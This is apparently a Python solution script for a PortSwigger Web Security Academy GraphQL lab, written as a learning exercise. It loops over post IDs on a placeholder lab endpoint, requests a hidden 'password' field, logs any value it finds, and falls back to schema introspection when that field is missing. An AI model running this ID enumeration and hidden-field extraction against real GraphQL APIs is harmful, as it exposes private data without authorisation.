"""
Lab 1: Accessing private GraphQL posts
https://portswigger.net/web-security/graphql/lab-graphql-sensitive-data
Difficulty: Apprentice

📝 A hidden blog post with a secret password isn't listed on the page, but
the underlying GraphQL query that fetches posts can be modified to pull it
directly — either by guessing/iterating its ID, or by querying the Post
type's fields (including ones the UI doesn't render) explicitly.
"""

from utils import get_session, graphql_query, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
ENDPOINT = f"{TARGET}/graphql/v1"  # confirm exact path via Burp HTTP history


def run():
    s = get_session()

    note("Step 1: observe the normal getPost query shape from Burp history,")
    note("then try iterating the 'id' argument across nearby values — the")
    note("hidden post is often just outside the range of listed IDs.")

    query = """
    query getPost($id: Int!) {
      getPost(id: $id) {
        id
        title
        body
        password
      }
    }
    """

    for post_id in range(0, 10):
        r, data = graphql_query(s, ENDPOINT, query, variables={"id": post_id})
        if data and data.get("data", {}).get("getPost"):
            post = data["data"]["getPost"]
            log(f"id={post_id}: {post.get('title')!r}")
            if post.get("password"):
                log(f"FOUND password field: {post['password']}")
                return
        else:
            errors = data.get("errors") if data else None
            log(f"id={post_id}: no post / error {errors}", ok=False)

    note("If 'password' isn't a queryable field, introspect the schema")
    note("first (see Lab 2's approach) to find the actual field name for")
    note("whatever carries the secret in this instance.")


if __name__ == "__main__":
    run()
